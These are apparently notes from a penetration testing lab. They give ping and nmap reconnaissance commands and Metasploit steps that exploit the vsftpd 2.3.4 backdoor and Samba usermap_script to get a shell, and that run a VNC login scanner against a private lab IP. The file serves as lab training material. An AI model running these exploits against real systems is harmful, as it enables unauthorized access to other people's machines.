# Lab commands and notes

> Commands used during the penetration testing lab (lab target IP used in report: 192.168.169.130).
> Do not run these on networks you do not own.

## 1. Basic connectivity
```bash
# ping the target
ping 192.168.169.130

2. Nmap service & OS detection
nmap -sV -O 192.168.169.130
# -sV -> probe open ports to determine service/version
# -O  -> attempt OS detection

3. Metasploit: start console
msfconsole

Exploit FTP (vsftpd backdoor example)
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.169.130
run
# After gaining a shell:
whoami

Exploit VNC (scanner)
search vnc
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.169.130
run

Exploit Samba (usermap_script example)
search usermap_script
use exploit/multi/samba/usermap_script
set RHOST 192.168.169.130
run
# After gaining a shell:
whoami
